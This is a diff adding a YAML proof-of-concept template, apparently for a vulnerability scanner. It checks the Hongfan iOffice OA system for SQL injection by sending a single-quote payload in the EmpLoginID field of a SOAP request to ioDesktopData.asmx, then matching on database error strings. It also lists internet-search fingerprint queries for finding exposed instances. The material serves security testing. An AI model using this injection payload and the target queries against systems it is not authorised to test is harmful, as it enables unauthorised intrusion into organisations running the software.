@@ -1,0 +1,40 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-hongfan-ioffice-ioDesktopData.asmx-sqli
+transport: http
+set:
+  s1: randomInt(1000000000, 9000000000)
+  s2: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /iOffice/prg/set/wss/ioDesktopData.asmx
+            headers:
+              Content-Type: text/xml; charset=utf-8 
+              SOAPAction: http://tempuri.org/GetDepSchedule
+            body: |
+              <?xml version="1.0" encoding="utf-8"?> 
+              <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> 
+              <soap:Body> 
+              <GetDepSchedule xmlns="http://tempuri.org/"> 
+              <EmpLoginID>1'</EmpLoginID> 
+              </GetDepSchedule> 
+              </soap:Body> 
+              </soap:Envelope>
+        expression: response.status == 500 && response.body_string.contains("qlException") && response.body_string.contains("语法错误")
+
+expression: r0() 
